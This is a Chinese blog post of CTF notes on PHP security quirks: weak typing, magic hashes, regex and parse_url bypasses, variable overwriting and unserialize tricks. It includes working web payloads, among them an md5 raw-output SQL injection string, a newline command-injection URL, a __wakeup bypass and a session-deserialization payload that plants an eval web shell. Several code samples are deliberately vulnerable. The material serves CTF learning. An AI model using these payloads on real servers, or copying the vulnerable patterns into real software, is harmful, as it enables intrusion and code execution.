---
title: CTF 中的 PHP 知识汇总
layout: post
category: [CTF]
tagline: 
keywords: [php, 安全, 漏洞, 教程, CTF]
show_reward: true
tags: [PHP, 安全, CTF]
---

 
## 基础知识

### 系统变量（超全局变量）

在全部作用域中始终可用的内置变量

```php
$GLOBALS // 引用全局作用域中可用的全部变量
$_POST // 获取 post 数据，是一个字典
$_GET // 获取 get 数据，是一个字典
$_COOKIE // 获取 cookie
$_SESSION // 获取 session
$_FILES // 获取上传的文件
$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据
$_ENV // 环境变量
$_SERVER // 服务器和执行环境信息
```
 
### 可变变量

可变变量是 php 独有的特性，可变变量指的是变量名可变，将一个普通变量的值作为可变变量的变量名，而变量（即普通变量）指的是变量值可变。

```php
$a="hello";
// 定义可变变量时，可以加上大括号
${$a}="world";

echo ${$a};
echo $$a; // 将普通变量的值 hello，作为可变变量的变量名，即 $a
echo $hello;
```

### 错误控制运算符
 
PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。
 
### 数组

定义数组的方法

```php
$a = array(
    "user" => "admin",
    "pass"=>"P@ssw0rd"
);

$a['user'] = 'admin';
$a['pass'] = 'P@ssw0rd';
```

### Quotation Marks

双引号解析变量，单引号不解析变量

```php
$str='hello';
echo "str is $str"; // 运行结果 : str is hello
echo 'str is $str'; // 运行结果 : str is $str
```

### 变量默认值
 
当定义一个变量，如果没有设置值，默认为0
 
### 打印变量

- print_r，显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。
- var_dump，返回变量的数据类型和值

```php
echo 'aaa';
echo('123');
print_r('aaa');
```

### 文件操作相关

列出目录

```php
scandir('/site')
```

输出文件内容

```php
show_source('flag.php');
highlight_file('flag.php');
var_dump(file('flag.php'));
print_r(file('flag.php'));
```

读取文件内容

```php
file_get_contents('flag.php');
# 也可以读取远程 URL 的文件
file_get_contents('http://xxx.xxx.com/index.html');
# 输入不合法的url会显示Error: Invalid URL，如果对php的报错熟悉会知道这可能是由 file_get_contents 函数触发的报错
```


## $_GET 和 $_POST
 
    http://www.example.com/web/false.php?name[]=a&password[]=b
 
如果 GET 参数中设置 `name[]=a`，那么 `$_GET['name'] = [a]`，php 会把 `[]=a` 当成数组传入， `$_GET` 会自动对参数调用 `urldecode`。
 
`$_POST` 同样存在此漏洞，提交的表单数据，`user[]=admin`，`$_POST['user']` 得到的是 `['admin']` 是一个数组。
 
## 内置函数的松散性
 
### strcmp 和 strcasecmp
 
strcmp 和 strcasecmp（不区分大小写） 用于比较字符串，返回值如下：

> 如果 str1 小于 str2 返回 < 0；
> 如果 str1 大于 str2 返回 > 0；
> 如果两者相等，返回 0。
 
- 5.2 中是将两个参数先转换成string类型。
- 5.3.3 以后，当比较数组和字符串的时候，返回是0。
- 5.5 中如果参数不是string类型，直接return了
 
数组跟字符串比较会返回 0

```php
$array=[1, 2, 3];
//这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等
var_dump(strcmp($array, 'abc')); 
var_dump(strcasecmp($array, 'abc')); 
```
 
### sha1 和 md5 函数
 
语法

```php
# raw为可选，规定十六进制或二进制输出格式
# TRUE - 原始 16 字节格式
# FALSE - 默认，32 字符十六进制数
md5(string, raw)
```

md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle
 
```php
sha1([]) === false
md5([]) === false
```

md5 和 sha1 支持第二个参数，如果为 true，则会将 hash 后的 16 进制字符串以 16 进制转成字符串的形式返回，如果在 SQL 语句中这样写，会存在注入的问题。

提供一个字符串：ffifdyop，md5后，276f722736c95d99e921722cf9ed621c
再转成字符串： 'or'6<trash>

```php
// 可以实现绕过
$password = "ffifdyop";
$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
var_dump($sql);
```

### parse_url

parse_url() 函数可以解析 URL，返回其组成部分，此函数并不意味着给定的 URL 是合法的，它只是将上方列表中的各部分分开。parse_url() 可接受不完整的 URL，并尽量将其解析正确。

**url解析错误**

parse_url在url不能被解析的时候就会返回false。

```php
<?php
$url = $_GET['url'];
var_dump(parse_url($url));
```

当一个url没有协议的时候，但是给一个端口url的字符串的时候parse_url就会爆错。这个经测试在windows下应该是php版本全通杀的(5.2-7.0)，linux没测试过。

```php
/pupiles.com:80
```

只要端口后面跟字母还是会解析，比如

```php
/pupiles.com:80a
array (size=1)
  'path' => string '/pupiles.com:80a' (length=16)
```

**端口解析错误**

```php
// php5.5以上这样的url用parse_url解析后预测的结果是
//pupiles.com/about:1234

array(2) {
  ["host"]=>
  string(11) "pupiles.com"
  ["path"]=>
  string(9) "/about:1234"
}
```

然而实际结果是

```php
array(3) {
  ["host"]=>
  string(11) "pupiles.com"
  ["port"]=>
  int(1234)
  ["path"]=>
  string(9) "/about:1234"
}
```

会默认解析出一个portkey

**路径解析错误**

```php
<?php
// single slash case
$uri = "/upload?/home/binarycloud/";
$data = parse_url($uri);
print_r($data);
// doubleslash case
$uri = "//upload?/home/binarycloud/";
$data = parse_url($uri);
print_r($data);
?>
```

输出结果

```php
Array
(
    [path] => /upload
    [query] => /home/binarycloud/
)
Array
(
    [host] => upload?
    [path] => /home/binarycloud/
)
```

**端口溢出**

在php5.3.13版本以下，当输入如下url

    http://pupiles:78325

按照正常来说应该会返回false，但是这里会返回

```php
array(3) { 
    ["scheme"]=> string(4) "http" 
    ["host"]=> string(7) "pupiles" 
    ["port"]=> int(12789) 
}
```

## 弱类型
 
- 当一个整形和一个其他类型行比较的时候，会先把其他类型 `intval` 再比较
- bool类型的 true 跟任意字符串可以弱类型相等 

```php
1 == '1abc' // true
true == 'abcd'  // true 
"42" == "42.0" // true
"42" == "000042.00" // true
"42" == "0x000000002A" // true
"10" == "1e1" // true
"42" == "0000000004.2E+1" // true
"42" == "42.0e+000000" // true

[false] == [0] == [NULL] == ['']
NULL == false == 0
```

```php
'0.999999999999999999999' == 1

# true in PHP 4.3.0+
'0e0' == '0e1'
'0e0' == '0E1'
'10e2' == ' 01e3'
'10e2' == '01e3'
'10e2' == '1e3'
'010e2' == '1e3'
'010e2' == '01e3'
'10' == '010'
'10.0' == '10'
'10' == '00000000010'
'12345678' == '00000000012345678'
'0010e2' == '1e3'
'123000' == '123e3'
'123000e2' == '123e5'

# true in 5.2.1+
# false in PHP 4.3.0 - 5.2.0
'608E-4234' == '272E-3063'

# true in PHP 4.3.0 - 5.6.x
# false in 7.0.0+
'0e0' == '0x0'
'0xABC' == '0xabc'
'0xABCdef' == '0xabcDEF'
'000000e1' == '0x000000'
'0xABFe1' == '0xABFE1'
'0xe' == '0Xe'
'0xABCDEF' == '11259375'
'0xABCDEF123' == '46118400291'
'0x1234AB' == '1193131'
'0x1234Ab' == '1193131'

# true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x
# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+
'0xABCdef' == ' 0xabcDEF'
'1e1' == '0xa'
'0xe' == ' 0Xe'
'0x123' == ' 0x123'

# true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0
# false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+
'0e0' == '0x0a'

# true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2
# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+
'0xe' == ' 0Xe.'
```



### intval 
 
`intval()` 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，`intval()` 不会报错而是返回 0。
 
```php
var_dump(intval('2')) // 2
var_dump(intval('3abcd')) // 3
var_dump(intval('abcd')) // 0

var_dump(0 == '0'); // true
var_dump(0 == 'abcdefg'); // true 
var_dump(0 === 'abcdefg'); // false
var_dump(1 == '1abcdef'); // true

if(intval($a) > 1000) {
    mysql_query("select * from news where id=".$a)
}
```

### trim 

trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f

```
$a = "  \n\r\t\v\0abc  \f";
var_dump(trim($a)); // abc  \f
```

利用 trim 及 is_numeric 等函数实现的绕过
```
<?php
    // %0c1%00
    $number = "\f1\0";
    // trim 函数会过滤 \n\r\t\v\0，但不会过滤过滤\f
    $number_2 = trim($number);
    var_dump($number_2); // \f1
    $number_2 = addslashes($number_2);
    var_dump($number_2);  // \f1
    // is_numeric 检测的时候会过滤掉 '', '\t', '\n', '\r', '\v', '\f' 等字符
    // 但是不会过滤 '\0'
    var_dump(is_numeric($number)); // false
    var_dump(strval(intval($number_2))); // 1
    var_dump("\f1" == "1"); // true
?>
```

### is_numeric
 
PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。
 
```php
<?php
echo is_numeric(233333);       // 1
echo is_numeric('233333');    // 1
echo is_numeric(0x233333);    // 1
echo is_numeric('0x233333');    // 1
echo is_numeric('9e9');   // 1
echo is_numeric('233333abc');  // 0
?>
```

is_numeric 检测的时候会自动过滤掉前面的 '  ', '\t', '\n', '\r', '\v', '\f' 等字符，但是不会过滤 '\0'，如果这些字符出现在字符串尾，也不会过滤，二是返回 false

```php
var_dump(is_numeric("\01")); // false

var_dump(is_numeric(" 1")); // true
var_dump(is_numeric("\t1")); // true
var_dump(is_numeric("\n1")); // true
var_dump(is_numeric("\r1")); // true
var_dump(is_numeric("\v1")); // true
var_dump(is_numeric("\f1")); // true
var_dump(is_numeric("\f\f1")); // true

var_dump(is_numeric("1\f")); // false
```

### 数组与字符串

当 `$var` 是一个字符串的时候，访问 `$var["any string"]` 跟访问 `$var[intval("any string")]` 效果是一样的。如果有变量覆盖，可以实现一些绕过。

```php
$userinfo = 'abcdefg';

$userinfo['id'] = 123;
// 这里等价于 $var[0] = 1，$userinfo['id'] = 1
$userinfo['role'] = 1;

if ($userinfo['id'] == 1) {
    echo 'flag{***}';
}
```

### in_array
 
in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下：
 
```php
in_array('b', array('a', 'b', 'c');
```
 
这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，`typeid=1’ union select..`  也能通过 in_array 的验证
 
 
```php
if (in_array($_GET('typeid'], array(1, 2, 3, 4))) {
    $sql="select …. where typeid=".$_GET['typeid']";
    echo $sql;
}
```
 
### == 和 === 
 
- `==` 是弱类型的比较
- `===` 比较符则可以避免这种隐式转换，除了检查值还检查类型。
 
以下比较的结果都为 true
 
```php
// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc
// 十六进制与整数，被转换为同一进制比较
'0xccccccccc' == '54975581388' 
 
// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0
1 == '1'
1 == '01'
10 == '1e1'
100 == '1e2' 
0 == 'a' // a 转换为数字为 0
 
// 十六进制数与带空格十六进制数，被转换为十六进制整数
'0xABCdef' == '     0xABCdef'
'0010e2' == '1e3'
```
 
### magic hash

md5

```
# 0e 开头，后面全是数字的
240610708: 0e462097431906509019562988736854
QLTHNDT: 0e405967825401955372549139051580
QNKCDZO: 0e830400451993494058024219903391
PJNPDWY: 0e291529052894702774557631701704
NWWKITQ: 0e763082070976038347657360817689
NOOPCJF: 0e818888003657176127862245791911
MMHUWUV: 0e701732711630150438129209816536
MAUXXQC: 0e478478466848439040434801845361
IHKFRNS: 0e256160682445802696926137988570
GZECLQZ: 0e537612333747236407713628225676
GGHMVOE: 0e362766013028313274586933780773
GEGHBXL: 0e248776895502908863709684713578
EEIZDOI: 0e782601363539291779881938479162
DYAXWCA: 0e424759758842488633464374063001
DQWRASX: 0e742373665639232907775599582643
BRTKUJZ: 00e57640477961333848717747276704
ABJIHVY: 0e755264355178451322893275696586
aaaXXAYW: 0e540853622400160407992788832284
aabg7XSs: 0e087386482136013740957780965295
aabC9RqS: 0e041022518165728065344349536299
```

sha1

```
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
```

crc32

```
6586: 0e817678
```

两个 md5 一样的字符串

```python
from binascii import unhexlify
from hashlib import md5
from future.moves.urllib.parse import quote

input1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify(
'd8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956')

print(quote(input1))
print md5(input1).hexdigest()

input2 = 'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n' + unhexlify('75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956')
print md5(input2).hexdigest()
print(quote(input2))
```

另外一组 md5 一样的字符串

```
from array import array
from hashlib import md5
input1 = array('I', [0x6165300e,0x87a79a55,0xf7c60bd0,0x34febd0b,0x6503cf04,0x854f709e,0xfb0fc034,0x874c9c65,0x2f94cc40,0x15a12deb,0x5c15f4a3,0x490786bb,0x6d658673,0xa4341f7d,0x8fd75920,0xefd18d5a])
input2 = array('I', [x^y for x,y in zip(input1, [0, 0, 0, 0, 0, 1<<10, 0, 0, 0, 0, 1<<31, 0, 0, 0, 0, 0])])
print(input1 == input2) # False
print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
```

magic hash

```
md2 32  505144726   0e015339760548602306096794382326    WhiteHat Security, Inc.
md4 32  48291204    0e266546927425668450445617970135    WhiteHat Security, Inc.
md5 32  240610708   0e462097431906509019562988736854    Michal Spacek
sha1    40  10932435112 0e07766915004133176347055865026311692244    Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham
sha224  56  –   –   –
sha256  64  –   –   –
sha384  96  –   –   –
sha512  128 –   –   –
ripemd128   32  315655854   0e251331818775808475952406672980    WhiteHat Security, Inc.
ripemd160   40  20583002034 00e1839085851394356611454660337505469745    Michael A Cleverly
ripemd256   64  –   –   –
ripemd320   80  –   –   –
whirlpool   128 –   –   –
tiger128,3  32  265022640   0e908730200858058999593322639865    WhiteHat Security, Inc.
tiger160,3  40  13181623570 00e4706040169225543861400227305532507173    Michele Spagnuolo
tiger192,3  48  –   –   –
tiger128,4  32  479763000   00e05651056780370631793326323796    WhiteHat Security, Inc.
tiger160,4  40  62241955574 0e69173478833895223726165786906905141502    Michele Spagnuolo
tiger192,4  48  –   –   –
snefru  64  –   –   –
snefru256   64  –   –   –
gost    64  –   –   –
adler32 8   FR  00e00099    WhiteHat Security, Inc.
crc32   8   2332    0e684322    WhiteHat Security, Inc.
crc32b  8   6586    0e817678    WhiteHat Security, Inc.
fnv132  8   2186    0e591528    WhiteHat Security, Inc.
fnv164  16  8338000 0e73845709713699    WhiteHat Security, Inc.
joaat   8   8409    0e074025    WhiteHat Security, Inc.
haval128,3  32  809793630   00e38549671092424173928143648452    WhiteHat Security, Inc.
haval160,3  40  18159983163 0e01697014920826425936632356870426876167    Independently found by Michael Cleverly & Michele Spagnuolo
haval192,3  48  48892056947 0e4868841162506296635201967091461310754872302741    Michael A. Cleverly
haval224,3  56  –   –   –
haval256,3  64  –   –   –
haval128,4  32  71437579    0e316321729023182394301371028665    WhiteHat Security, Inc.
haval160,4  40  12368878794 0e34042599806027333661050958199580964722    Michele Spagnuolo
haval192,4  48  –   –   –
haval224,4  56  –   –   –
haval256,4  64  –   –   –
haval128,5  32  115528287   0e495317064156922585933029613272    WhiteHat Security, Inc.
haval160,5  40  33902688231 00e2521569708250889666329543741175098562    Michele Spagnuolo
haval192,5  48  52888640556 0e9108479697641294204710754930487725109982883677    Michele Spagnuolo
haval224,5  56  –   –   –
haval256,5  64  –   –   –
```

### hash 比较的问题
 
0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。
 
```php
// '0e5093234' 为 0，'0eabc3234' 不为 0
 
// true
'0e509367213418206700842008763514' == '0e481036490867661113260034900752'
// true
'0e481036490867661113260034900752' == '0' 
 
// false
var_dump('0' == '0e1abcd');
// true
var_dump(0 == '0e1abcd');
 
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
```
 
如果要找出 `0e` 开头的 hash 碰撞，可以用如下代码
 
```php
<?php
 
$salt = 'vunp';
$hash = '0e612198634316944013585621061115';
 
for ($i=1; $i<100000000000; $i++) {
    if (md5($salt . $i) == $hash) {
        echo $i;
        break;
    }
}
 
echo '  done';
```
 
## switch 
 
如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int类型。
 
```php
$i ="2abc";
switch ($i)  {
    case 0:
    case 1:
    case 2:
        echo "i is less than 3 but not negative";
        // 如果$i = 2/../flag_is_here，则通过这种方式可以包含 flag_is_here.php 文件
        require_once $i.'.php';
        echo $flag;
        break;
    case 3:
        echo "i is 3";
}
```
 
这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 `$i` 进行了类型转换，转换结果为 2。
 
## 正则表达式

### preg_match
 
preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(`^` 和 `$`)，则可以存在绕过的问题
 
```php
$ip = '1.1.1.1 abcd'; // 可以绕过
if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {
  die('error');
} else {
  // echo('key...')
}
```
pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:

```php
$code="xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)";
preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/", $code));
```

就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印'regex failed'.

http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami


如果开启了/m，会存在绕过 
 
```php
<?php
$file_name=$_GET['path'];
if (!preg_match("/^[a-zA-Z0-9-s_]+.rpt$/m", $file_name)) {
  echo "regex failed";
} else {
    echo exec("/usr/bin/file -i -b ".$file_name);
}
```

注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后`^`和`$`的含义就发生了变化，没开启多行模式之前(即单行匹配模式), `^` 和`$` 是匹配字符串的开始和结尾，开启多行模式之后，多行模式`^`,`$`可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。

http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami

开启/m
```
^ 行首
$ 行尾
```

不开启/m

```
^ 字符串的开始
$ 字符串的结尾
```

修饰符说明

```
i 在和正则匹配是不区分大小写 
m 将字符串视为多行。默认的正则开始“^”和结束“$”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“$”。 
o 评估表达式只有一次
s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 
x 忽略空白，除非进行转义的不被忽略。 
g 在全局范围内找到所有匹配
cg 即使全局匹配失败也允许搜索继续
```

### preg_match_all

正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 

### ereg %00 截断

ereg 读到 %00 的时候，就截止了
 
```php
<?php
    if (ereg ("^[a-zA-Z]+$", $_GET['a']) === FALSE)  {
        echo 'You password must be alphabet';
    }
?>
```

这里 `a=abcd%001234`，可以绕过


## 变量覆盖
 
### extract 
 
extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。
 
```php
<?php  
    $auth = '0';  
    // 这里可以覆盖$auth的变量值
    extract($_GET); 
    if($auth == 1){  
        echo "private!";  
    } else{  
        echo "public!";  
    }  
?>  
```
 
### parse_str
 
parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。
 
```php
//var.php?var=new  
$var='init';  
parse_str($_SERVER['QUERY_STRING']);
// $var 会变成 new
echo $var;
```
 
### $$ 变量覆盖
 
如果把变量本身的 key 也当变量，也就是使用了 `$$`，就可能存在问题。
 
```php
$_ = '_POST';
// $$_ 是等于 $_POST 
```
 
例子
 
```php
// http://127.0.0.1/index.php?_CONFIG=123
$_CONFIG['extraSecure'] = true;
 
foreach(array('_GET','_POST') as $method) {
    foreach($$method as $key=>$value) {
      // $key == _CONFIG
      // $$key == $_CONFIG
      // 这个函数会把 $_CONFIG 变量销毁
      unset($$key);
    }
}
 
if ($_CONFIG['extraSecure'] == false) {
    echo 'flag {****}';
}
```
 
数组类型数据的覆盖


```php
// index.php?_SESSION[userinfo][id]=1&_SESSION[userinfo][username]=admin

foreach (array('_COOKIE','_POST','_GET') as $_request)  
{
    foreach ($$_request as $_key=>$_value)  
    {
        $$_key=  $_value;
    }
}

echo $_SESSION["userinfo"]["id"];
echo '<br>';
echo $_SESSION["userinfo"]["username"];
```

但是如果后面有 `session_start()` 会重新初始化上面的 `$_SESSION` 数据，因此又被还原回去。

## unset
 
`unset($bar);` 用来销毁指定的变量，如果变量 `$bar` 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。
 
 
## 特殊的 PHP 代码格式
 
以这种后缀结尾的 php 文件也能被解析，这是在 fast-cgi 里面配置的

- .php2
- .php3
- .php4
- .php5
- .php7
- .phtml
 
正则检测文件内容中包含 `<?` 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过
 
```php
# 除了 php 7.0 不允许外，其他都允许
<script language="php">
echo base64_encode(file_get_contents('flag.php'));
</script>
```

如果在 php.ini 文件中配置允许 ASP 风格的标签
 
```ini
; Allow ASP-style <% %> tags.
; http://php.net/asp-tags
asp_tags = On
```
 
则可以使用该方式
 
```php
<% echo 'a'; %>
```
 
php.ini 文件中配置 short_open_tag 默认为 Off，如果为 On，则允许这种代码

```
<?  echo base64_encode(file_get_contents('flag.php')); ?>
```

效果等于 echo 'a';
 
```php
<?='a';?>
```

## 伪随机数
 
### mt_rand()

mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。
 
```php
$seed = 12345;
mt_rand($seed);
 
$ss = mt_rand();
```

linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。
但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 [php_mt_seed](http://www.openwall.com/php_mt_seed/)。

 在 php  > 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。

### rand()

rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看[这里](http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/)。产生的随机数可以用下面这个公式预测:

```
# 一般预测值可能比实际值要差1
state[i] = state[i-3] + state[i-31]
```

可以用下面的代码验证一下

```php
<?php 
$randStr = array(); 
for($i=0;$i<50;$i++) {  //先产生 32个随机数 
    $randStr[$i]=rand(0,30); 
    if($i>=31) { 
        echo  "$randStr[$i]=(".$randStr[$i-31]."+".$randStr[$i-3].") mod 31"."\n"; 
    } 
} 
?> 
```

## 反序列化

- __construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
- __destruct()：析构函数，当对象被销毁时会自动调用。
- __wakeup() ：如前所提，unserialize()时会自动调用。

PHP `unserialize()` 后会导致 `__wakeup()` 或 `__destruct()` 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 `__wakeup()` 或 `__destruct()` 中。


### `__wakeup` 函数绕过

PHP 有个 [Bug](https://bugs.php.net/bug.php?id=72663)，触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10，该漏洞可以简要的概括为：当序列化字符串中表示对象个数的值`大于`真实的属性个数时会跳过 `__wakeup` 函数的执行，例如：
 
```php
<?php
class xctf
{
    public $flag = "111";
 
    public function __wakeup()
    {
        exit('bad requests');
    }
}
 
//echo serialize(new xctf());
echo unserialize($_GET['code']);
echo "flag{****}";
?>
```
 
使用这个 payload 绕过 `__wakeup` 函数
 
```
# O:4:"xctf":1:{s:4:"flag";s:3:"111";}
http://www.example.com/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```
 
在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 `__wakeup` 函数，从而绕过该函数。

### 变量可以用引用

可以通过将变量的值存储为另外一个变量的地址，类似于 C 语言中的引用。

```php
class just4fun 
{ 
    var $enter; 
    var $secret; 
} 

$a = new just4fun();
$a->secret = "123";
// 这里的 & 跟 C 语言一样，是取 $a->secret 值的地址赋给 $a->enter
$a->enter = &$a->secret;

$o = unserialize(serialize($a));

if ($o) { 
    $o->secret = "xxxxxxx";
    // 因为 $o->enter 存储的是 $o->secret 的值的地址，因此比较的时候相等的
    if ($o->secret === $o->enter) 
        echo "Congratulation! Here is my Key: " . $o->secret; 
}
```

### 小特性

以下两个都能够被unserialize反序列化，且结果相同。

```
O:+4:"test":1:{s:1:"a";s:3:"aaa";}
O:4:"test":1:{s:1:"a";s:3:"aaa";}
```

不光object类型处理可以多一个’+’,其他类型也可以。但是如果要进一步通过修改变量的个数来绕过 __wakeup，在 php 5.5 环境下可以，php 5.6 环境下反序列化会失败

```
#  php 5.5 环境下可以绕过 __wakeup，php 5.6 环境下反序列化会失败
O:+4:"test":2:{s:1:"a";s:3:"aaa";}
```

### Session 反序列化

PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：

处理器                         |对应的存储格式
------------------------------|-------------
php                           |键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary                    |键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize <br>(php>=5.5.4)|经过 serialize() 函数反序列处理的数组

如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。

```php
//foo1.php

ini_set('session.serialize_handler', 'php_serialize');
session_start();

$_SESSION['ryat'] = $_GET['ryat'];


//foo2.php

ini_set('session.serialize_handler', 'php');
//or session.serialize_handler set to php in php.ini 
session_start();

class ryat {
    var $hi;
    
    function __wakeup() {
        echo 'hi';
    }
    function __destruct() {
        echo $this->hi;
    }
}
```

当访问 foo1.php 时，提交数据如下：

```
foo1.php?ryat=|O:4:"ryat":1:{s:2:"hi";s:4:"ryat";}
```
脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象。这个场景的利用需要能够构造 Session 的值，如果没有提供写入 Session 的地方，可以利用 `Session Upload Progress`。


> 注意：如果利用这种方式上传了 webshell，读取文件的时候需要使用绝对路径，例如 /opt/lampp/htdocs/index.php

### Session Upload Progress

上传文件时，如果 POST 一个名为 `PHP_SESSION_UPLOAD_PROGRESS` 的变量，就可以将 filename 的值赋值到session 中，filename 的值如果包含双引号，还需要进行转义，上传的页面的写法如下：


```html
<form action="http://example.com/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

最后 Session 就会保存上传的文件名。如果没有提供写入 Session 的地方，可以用这种方法。POST 请求的数据包：

```
POST / HTTP/1.1
Host: web.jarvisoj.com:32784
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypN9LkEc0KCMj7TfC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3208.0 Safari/537.36
Cookie: PHPSESSID=jfdu23je5jlu43sfgc3akp3037
Content-Length: 302

------WebKitFormBoundarypN9LkEc0KCMj7TfC
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123
------WebKitFormBoundarypN9LkEc0KCMj7TfC
Content-Disposition: form-data; name="file"; filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:39:\"echo \"waterfood\"; eval($_REQUEST[\"v\"]);\";}"
Content-Type: text/plain

123
------WebKitFormBoundarypN9LkEc0KCMj7TfC--
```

## 文件包含

这种 url 很容易就能想到可能是文件包含或者伪协议读取
 
```
http://10.2.1.1:20770/index.php?page=upload
http://10.2.1.1:20770/index.php?page=php://filter/read=convert.base64-encode/resource=upload
```

常见的导致文件包含的函数有

- include()
- include_once()
